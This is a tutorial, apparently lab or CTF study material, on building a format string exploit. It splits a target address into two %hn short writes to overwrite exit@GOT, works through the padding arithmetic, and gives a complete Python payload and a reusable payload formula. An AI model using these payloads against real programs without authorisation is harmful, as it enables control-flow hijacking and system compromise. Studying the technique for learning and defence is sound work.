# Format String Padding Calculation Guide

## Understanding Low and High Bytes

When writing a 32-bit address using format string exploits, we often need to write it in two 16-bit (2-byte) chunks because writing the full 32-bit value in one go would require massive padding (up to 4 billion characters).

### Memory Layout

A 32-bit address like `0xffffd87c` is stored in memory as 4 bytes:

```
Address: 0xffffd87c

Byte layout (little-endian):
[7c] [d8] [ff] [ff]
 ↑    ↑    ↑    ↑
byte0 byte1 byte2 byte3

Low bytes  (bytes 0-1): 0xd87c
High bytes (bytes 2-3): 0xffff
```

### Why Split Into Low and High?

**Problem**: Using `%n` writes the number of bytes printed so far. To write `0xffffd87c` (4,294,954,108 in decimal), we'd need to print 4+ billion characters!

**Solution**: Use `%hn` (short write) to write 2 bytes at a time:
1. Write low bytes (`0xd87c`) to address `0x080497e0`
2. Write high bytes (`0xffff`) to address `0x080497e2` (offset +2)

## Step-by-Step Calculation

### Example: Writing `0xffffd87c` to `exit@GOT` at `0x080497e0`

#### Step 1: Split the Target Address

```
Target address: 0xffffd87c

Low bytes  = 0xd87c = 55420 (decimal)
High bytes = 0xffff = 65535 (decimal)
```

#### Step 2: Determine Write Order

**Always write from smallest to largest value** to avoid integer overflow issues.

```
55420 < 65535
So: Write low bytes first, then high bytes
```

#### Step 3: Build the Payload Structure

```
[addr_low][addr_high][padding1][%10$hn][padding2][%11$hn]
    ↓         ↓          ↓         ↓        ↓        ↓
  4 bytes  4 bytes   variable   write1  variable  write2
```

Where:
- `addr_low` = `0x080497e0` (where to write low bytes)
- `addr_high` = `0x080497e2` (where to write high bytes)
- `%10$hn` = write 2 bytes to address at stack position 10
- `%11$hn` = write 2 bytes to address at stack position 11

#### Step 4: Calculate First Padding

We've already printed 8 bytes (two 4-byte addresses). We need to reach 55420 total bytes:

```
padding1 = target_value - bytes_already_printed
padding1 = 55420 - 8
padding1 = 55412
```

Format: `%55412d` (print a number with 55412 characters of padding)

#### Step 5: Calculate Second Padding

After the first write, we've printed 55420 bytes total. We need to reach 65535:

```
padding2 = next_target - bytes_already_printed
padding2 = 65535 - 55420
padding2 = 10115
```

Format: `%10115d` (print a number with 10115 characters of padding)

### Final Payload

```python
payload = '\x08\x04\x97\xe0'[::-1]  # addr_low  (reversed for little-endian)
payload += '\x08\x04\x97\xe2'[::-1] # addr_high (reversed for little-endian)
payload += '%55412d'                 # padding to reach 55420
payload += '%10$hn'                  # write 55420 (0xd87c) to addr_low
payload += '%10115d'                 # padding to reach 65535
payload += '%11$hn'                  # write 65535 (0xffff) to addr_high
```

## Visual Example

```
Bytes printed:  [0-3]  [4-7]  [8...55419]  [55420]  [55421...65534]  [65535]
Payload:        [addr] [addr] [%55412d]    [%10$hn] [%10115d]        [%11$hn]
                  ↓      ↓        ↓            ↓         ↓               ↓
Stack pos 10:  0x080497e0                  writes 0xd87c here
Stack pos 11:         0x080497e2                              writes 0xffff here

Result in memory at 0x080497e0:
[7c] [d8] [ff] [ff] = 0xffffd87c ✓
```

## Common Pitfalls

### 1. Wrong Byte Order (Endianness)

```python
# ❌ WRONG - Big-endian
'\x08\x04\x97\xe0'

# ✅ CORRECT - Little-endian (reversed)
'\x08\x04\x97\xe0'[::-1]  # Results in: '\xe0\x97\x04\x08'
```

### 2. Writing in Wrong Order

If high bytes < low bytes, write high first:

```
Target: 0x0804d87c
Low:  0xd87c = 55420
High: 0x0804 = 2052

Since 2052 < 55420, write high bytes first!
```

### 3. Forgetting Address Bytes in Padding

```python
# ❌ WRONG
padding1 = 55420  # Forgot we already printed 8 bytes!

# ✅ CORRECT
padding1 = 55420 - 8  # Account for the two 4-byte addresses
```

## Quick Reference Formula

```python
# Given target address TARGET and GOT address GOT_ADDR:

low_bytes  = TARGET & 0xffff
high_bytes = (TARGET >> 16) & 0xffff

# If low_bytes < high_bytes:
padding1 = low_bytes - 8
padding2 = high_bytes - low_bytes
payload = pack("<I", GOT_ADDR) + pack("<I", GOT_ADDR+2) + \
          f"%{padding1}d%10$hn" + f"%{padding2}d%11$hn"

# If high_bytes < low_bytes:
padding1 = high_bytes - 8
padding2 = low_bytes - high_bytes
payload = pack("<I", GOT_ADDR+2) + pack("<I", GOT_ADDR) + \
          f"%{padding1}d%10$hn" + f"%{padding2}d%11$hn"
```

## Additional Notes

- `%n` writes 4 bytes (int)
- `%hn` writes 2 bytes (short)
- `%hhn` writes 1 byte (char)
- Stack positions (`%10$hn`) depend on where your input lands on the stack
- Use GDB to find the correct stack positions for your input

